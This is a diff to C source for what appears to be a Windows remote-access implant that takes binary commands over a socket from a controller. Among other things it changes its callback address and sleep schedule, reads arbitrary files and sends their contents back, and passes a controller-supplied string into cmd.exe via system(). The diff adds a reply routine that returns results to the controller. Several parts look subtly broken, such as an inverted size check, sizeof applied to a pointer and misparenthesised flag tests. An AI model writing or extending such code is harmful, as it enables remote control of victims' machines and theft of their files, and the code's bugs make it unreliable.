@@ -55,18 +55,26 @@ int setup(struct s_configs *configs){
   return 0;
 }
 
-int reply(uint16_t command, char *data, int datasize){
-
+int reply(uint16_t command, char *data, int datasize, int sockfd){
+  uint8_t message[5 + datasize];
+  message[0] = 0xAA;
+  message[1] = 0x02;
+  message[2] = datasize;
+  memcpy(&message[3], &command, 2);
+  if(datasize < 0){
+    memcpy(&message[5], data, datasize);
+  }
+  send(sockfd, message, sizeof(message), 0);
   return 0;
 }
 
-int change_configs(union u_commands *u, struct s_configs *configs){
+int change_configs(int sockfd, union u_commands *u, struct s_configs *configs){
   memcpy(&configs->out_addr, &u->change_configs[0], 4);
   memcpy(&configs->out_port, &u->change_configs[4], 2);
   memcpy(&configs->sleep_hour, &u->change_configs[7], 1);
   memcpy(&configs->sleep_hour, &u->change_configs[8], 1);
   setup(configs);
-  reply(0x01, NULL, 0);
+  reply(0x01, NULL, 0, sockfd);
   return 0;
 }
 
@@ -74,7 +82,7 @@ int ls_file(union u_commands *u){
 
 }
 
-int cat_file(union u_commands *u){
+int cat_file(int sockfd, union u_commands *u){
   FILE* f = fopen(u->filepath, "rb");
   DWORD filesize = GetFileSize(f, NULL);
   uint8_t* buff = malloc(filesize);
@@ -90,7 +98,7 @@ int cat_file(union u_commands *u){
       x += 1;
     }
   }
-  reply(0x04, buff, sizeof(buff));
+  reply(0x04, buff, sizeof(buff), sockfd);
   free(buff);
   return 0;
 }
@@ -131,10 +139,11 @@ int location(){
 
 }
 
-int display_message(union u_commands *u){
+int display_message(int sockfd, union u_commands *u){
   char message[255];
   snprintf(message, sizeof(message), "start cmd.exe /S /K cd \\ ^&^& echo %s", u->message);
   system(message);
+  reply(0x1000, NULL, 0, sockfd);
   return 0;
 }
 
@@ -210,13 +219,13 @@ int command(int sockfd, struct s_configs *configs){
   uint8_t vardata = 0;
   uint16_t commands = (buff[3] * 0x100) + buff[4];
   if(commands == 0){
-    reply(0, NULL, 0);
+    reply(0, NULL, 0, sockfd);
     return 0;   
   }
   else if(commands & 0x01 == 0x01){
     memset(&u, 0, sizeof(u));
     memcpy(&u.change_configs, &buff[offset], 8);
-    change_configs(&u, configs);
+    change_configs(sockfd, &u, configs);
     offset += 8;
   }
   else if(commands & 0x02 == 0x02){
@@ -230,7 +239,7 @@ int command(int sockfd, struct s_configs *configs){
     vardata = buff[offset];
     memset(&u, 0, sizeof(u));
     memcpy(&u.filepath, &buff[offset + 1], vardata);
-    cat_file(&u);
+    cat_file(sockfd, &u);
     offset += vardata;
   }
   else if(commands & 0x08 == 0x08){
@@ -282,7 +291,7 @@ int command(int sockfd, struct s_configs *configs){
     vardata = buff[offset];
     memset(&u, 0, sizeof(u));
     memcpy(&u.message, &buff[offset + 1], vardata);
-    display_message(&u);
+    display_message(sockfd, &u);
     offset += vardata;
   }
   else if(commands & 0x2000 == 0x2000){
@@ -294,6 +303,7 @@ int command(int sockfd, struct s_configs *configs){
   else if(commands & 0x8000 == 0x8000){
     reconnect();
   }
+  reply(0x00, NULL, 0, sockfd);
   return 0;
 }
 
